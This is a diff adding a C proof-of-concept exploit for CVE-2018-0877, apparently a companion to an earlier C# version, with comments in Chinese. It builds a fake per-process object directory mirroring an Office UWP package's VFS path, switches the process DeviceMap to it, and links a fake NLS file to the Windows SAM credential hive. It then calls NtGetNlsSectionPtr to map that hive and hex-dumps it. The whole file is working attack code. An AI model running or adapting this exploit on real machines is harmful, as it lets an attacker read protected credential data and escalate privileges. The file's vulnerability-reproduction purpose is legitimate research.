@@ -1,0 +1,320 @@
+//复现CVE-2018-0877时所写的c版poc 由于我没有花时间在获取VFS路径上以及设置uwp进程属性上
+//所以你需要编译后将进程放在原来c#版poc的同目录下，并更改c#版poc的一行代码将新启动的uwp进程名改为编译后的进程
+
+#include <windows.h>
+#include <stdio.h>
+#include <Psapi.h>
+#include <profileapi.h>
+
+#define OBJ_CASE_INSENSITIVE   0x00000040
+#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
+#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
+
+typedef struct _LSA_UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG           Length;
+	HANDLE          RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG           Attributes;
+	PVOID           SecurityDescriptor;
+	PVOID           SecurityQualityOfService;
+
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+
+typedef NTSTATUS(WINAPI* NtCreateDirectoryObject_t)(OUT PHANDLE           DirectoryHandle,
+	IN ACCESS_MASK        DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes);
+
+typedef NTSTATUS(WINAPI* NtOpenDirectoryObject_t)(OUT PHANDLE           DirectoryHandle,
+	IN ACCESS_MASK        DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes);
+NtCreateDirectoryObject_t  NtCreateDirectoryObject;
+
+typedef VOID(WINAPI* RtlInitUnicodeString_t)(IN OUT PUNICODE_STRING DestinationString,
+	IN PCWSTR              SourceString OPTIONAL);
+
+#define InitializeObjectAttributes(i, o, a, r, s) {  \
+                (i)->Length = sizeof(OBJECT_ATTRIBUTES); \
+                (i)->RootDirectory = r;                  \
+                (i)->Attributes = a;                     \
+                (i)->ObjectName = o;                     \
+                (i)->SecurityDescriptor = s;             \
+                (i)->SecurityQualityOfService = NULL;    \
+            }
+
+RtlInitUnicodeString_t        RtlInitUnicodeString;
+HANDLE hDriver;
+
+typedef enum _PROCESSINFOCLASS {
+	ProcessBasicInformation,
+	ProcessQuotaLimits,
+	ProcessIoCounters,
+	ProcessVmCounters,
+	ProcessTimes,
+	ProcessBasePriority,
+	ProcessRaisePriority,
+	ProcessDebugPort,
+	ProcessExceptionPort,
+	ProcessAccessToken,
+	ProcessLdtInformation,
+	ProcessLdtSize,
+	ProcessDefaultHardErrorMode,
+	ProcessIoPortHandlers,
+	ProcessPooledUsageAndLimits,
+	ProcessWorkingSetWatch,
+	ProcessUserModeIOPL,
+	ProcessEnableAlignmentFaultFixup,
+	ProcessPriorityClass,
+	ProcessWx86Information,
+	ProcessHandleCount,
+	ProcessAffinityMask,
+	ProcessPriorityBoost,
+	ProcessDeviceMap,
+	ProcessSessionInformation,
+	ProcessForegroundInformation,
+	ProcessWow64Information,
+	ProcessImageFileName,
+	ProcessLUIDDeviceMapsEnabled,
+	ProcessBreakOnTermination,
+	ProcessDebugObjectHandle,
+	ProcessDebugFlags,
+	ProcessHandleTracing,
+	ProcessIoPriority,
+	ProcessExecuteFlags,
+	ProcessTlsInformation,
+	ProcessCookie,
+	ProcessImageInformation,
+	ProcessCycleTime,
+	ProcessPagePriority,
+	ProcessInstrumentationCallback,
+	ProcessThreadStackAllocation,
+	ProcessWorkingSetWatchEx,
+	ProcessImageFileNameWin32,
+	ProcessImageFileMapping,
+	ProcessAffinityUpdateMode,
+	ProcessMemoryAllocationMode,
+	ProcessGroupInformation,
+	ProcessTokenVirtualizationEnabled,
+	ProcessConsoleHostProcess,
+	ProcessWindowInformation,
+	MaxProcessInfoClass
+} PROCESSINFOCLASS;
+
+typedef  struct _PROCESS_DEVICEMAP_INFORMATION {
+	HANDLE DirectoryHandle;
+} PROCESS_DEVICEMAP_INFORMATION, * PPROCESS_DEVICEMAP_INFORMATION;
+
+DWORD dw;
+
+typedef NTSTATUS(WINAPI* NtCreateSymbolicLinkObject_t)(OUT PHANDLE           SymbolicLinkHandle,
+	IN ACCESS_MASK        DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes,
+	IN PUNICODE_STRING    TargetName);
+
+NtCreateSymbolicLinkObject_t  NtCreateSymbolicLinkObject;
+NtOpenDirectoryObject_t       NtOpenDirectoryObject;
+
+typedef NTSTATUS(WINAPI* NtSetInformationProcess_t)(IN HANDLE           ProcessHandle,
+	IN PROCESSINFOCLASS ProcessInformationClass,
+	IN PVOID            ProcessInformation,
+	IN ULONG            ProcessInformationLength);
+
+NtSetInformationProcess_t NtSetInformationProcess;
+
+typedef NTSTATUS(WINAPI* NtGetNlsSectionPtr)(DWORD NlsType, DWORD CodePage, PVOID p, PVOID* SectionPointer, PULONG SectionSize);
+
+NtGetNlsSectionPtr tNtGetNlsSectionPtr;
+
+
+
+NTSTATUS SetProcessDeviceMap(HANDLE DirectoryHandle) {
+
+	NTSTATUS NtStatus = 0;
+	PROCESS_DEVICEMAP_INFORMATION DeviceMap = { DirectoryHandle };
+
+	NtStatus = NtSetInformationProcess(GetCurrentProcess(),
+		ProcessDeviceMap,
+		&DeviceMap,
+		sizeof(DeviceMap));
+
+	if (NtStatus != 0) {
+		printf("\t\t[-] Failed to set per-process DeviceMap: 0x%X\n", NtStatus);
+		getchar();
+		exit(EXIT_FAILURE);
+	}
+	return 0;
+}
+
+HANDLE hFile = NULL;
+ULONG BytesReturned;
+HANDLE hTempObject = NULL;
+HANDLE hGlobalRootObject = NULL;
+HANDLE hPerProcessRootObject = NULL;
+
+HANDLE CreateObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) {
+	HANDLE DirectoryHandle = NULL;
+	UNICODE_STRING ObjectName = { 0 };
+	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
+	PUNICODE_STRING pUnicodeObjectName = NULL;
+
+	if (DirectoryName) {
+		RtlInitUnicodeString(&ObjectName, DirectoryName);
+		pUnicodeObjectName = &ObjectName;
+	}
+
+	InitializeObjectAttributes(&ObjectAttributes,
+		pUnicodeObjectName,
+		OBJ_CASE_INSENSITIVE,
+		hRoot,
+		0);
+
+	int NtStatus = NtCreateDirectoryObject(&DirectoryHandle, DIRECTORY_ALL_ACCESS, &ObjectAttributes);
+
+	if (NtStatus != 0) {
+		printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
+		getchar();
+	}
+	return DirectoryHandle;
+}
+
+HANDLE CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName) {
+	HANDLE SymbolicLinkHandle = NULL;
+	UNICODE_STRING TargetObjectName = { 0 };
+	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
+	UNICODE_STRING SymbolicLinkObjectName = { 0 };
+
+	RtlInitUnicodeString(&SymbolicLinkObjectName, SymbolicLinkName);
+	RtlInitUnicodeString(&TargetObjectName, TargetName);
+
+	InitializeObjectAttributes(&ObjectAttributes,
+		&SymbolicLinkObjectName,
+		OBJ_CASE_INSENSITIVE,
+		hRoot,
+		NULL);
+
+	int NtStatus = NtCreateSymbolicLinkObject(&SymbolicLinkHandle,
+		SYMBOLIC_LINK_ALL_ACCESS,
+		&ObjectAttributes,
+		&TargetObjectName);
+
+	if (NtStatus != 0) {
+		printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
+		getchar();
+	}
+	return SymbolicLinkHandle;
+}
+
+HANDLE OpenObjectDirectory(HANDLE hRoot, LPCWSTR DirectoryName) {
+
+	HANDLE DirectoryHandle = NULL;
+	UNICODE_STRING ObjectName = { 0 };
+	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
+
+	RtlInitUnicodeString(&ObjectName, DirectoryName);
+	InitializeObjectAttributes(&ObjectAttributes, &ObjectName, OBJ_CASE_INSENSITIVE, hRoot, NULL);
+
+	int NtStatus = NtOpenDirectoryObject(&DirectoryHandle, MAXIMUM_ALLOWED, &ObjectAttributes);
+	if (NtStatus != 0) {
+		printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
+		getchar();
+		exit(EXIT_FAILURE);
+	}
+	return DirectoryHandle;
+}
+
+VOID InitAPI() {
+
+	LPCSTR nt = "ntdll";
+	HMODULE hntdll = GetModuleHandleA(nt);
+	NtSetInformationProcess = (NtSetInformationProcess_t)GetProcAddress(hntdll, "NtSetInformationProcess");
+	NtCreateDirectoryObject = (NtCreateDirectoryObject_t)GetProcAddress(hntdll, "NtCreateDirectoryObject");
+	RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hntdll, "RtlInitUnicodeString");
+	NtOpenDirectoryObject = (NtOpenDirectoryObject_t)GetProcAddress(hntdll, "NtOpenDirectoryObject");
+	NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(hntdll, "NtCreateSymbolicLinkObject");
+	tNtGetNlsSectionPtr = (NtGetNlsSectionPtr)GetProcAddress(hntdll, "NtGetNlsSectionPtr");
+	
+}
+
+void DumpHex(const void* data, size_t size) {
+	char ascii[17];
+	size_t i, j;
+	ascii[16] = '\0';
+	for (i = 0; i < size; ++i) {
+		printf("%02X ", ((unsigned char*)data)[i]);
+		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
+			ascii[i % 16] = ((unsigned char*)data)[i];
+		}
+		else {
+			ascii[i % 16] = '.';
+		}
+		if ((i + 1) % 8 == 0 || i + 1 == size) {
+			printf(" ");
+			if ((i + 1) % 16 == 0) {
+				printf("|  %s \n", ascii);
+			}
+			else if (i + 1 == size) {
+				ascii[(i + 1) % 16] = '\0';
+				if ((i + 1) % 16 <= 8) {
+					printf(" ");
+				}
+				for (j = (i + 1) % 16; j < 16; ++j) {
+					printf("   ");
+				}
+				printf("|  %s \n", ascii);
+			}
+		}
+	}
+}
+
+
+int main() {
+
+	//获得nt函数地址
+	InitAPI();
+
+	//创建根目录对象
+	hPerProcessRootObject = CreateObjectDirectory(NULL, NULL);
+
+	//创建目录对象
+	hTempObject = CreateObjectDirectory(hPerProcessRootObject, L"C:");
+	hTempObject = CreateObjectDirectory(hTempObject, L"Program Files");
+	hTempObject = CreateObjectDirectory(hTempObject, L"WindowsApps");
+	hTempObject = CreateObjectDirectory(hTempObject, L"Microsoft.MicrosoftOfficeHub_17.8010.5926.0_x86__8wekyb3d8bbwe");
+	hTempObject = CreateObjectDirectory(hTempObject, L"VFS");
+	hTempObject = CreateObjectDirectory(hTempObject, L"SystemX86");
+
+	//修改进程的DeviceMap 
+	SetProcessDeviceMap(hPerProcessRootObject);
+
+	hGlobalRootObject = OpenObjectDirectory(NULL, L"\\GLOBAL??");
+
+	//创建符号链接
+	hTempObject = CreateSymlink(hTempObject, L"c_1337.nls", L"\\GLOBAL??\\C:\\Windows\\System32\\config\\SAM");
+
+	ULONG ret=0;
+
+	CHAR* ret2 ;
+
+	getchar();
+	printf("tNtGetNlsSectionPtr ret %x  \n",tNtGetNlsSectionPtr(11, 1337, 0, (PVOID*)&ret2, &ret));
+
+	printf(" map %x  size %x \n", ret2, ret);
+
+	if (ret)
+	{
+		DumpHex(ret2, 0x100);
+	}
+
+	//还原进程的DeviceMap
+	SetProcessDeviceMap(hGlobalRootObject);
+
+	getchar();
+
+	return 0;
+}
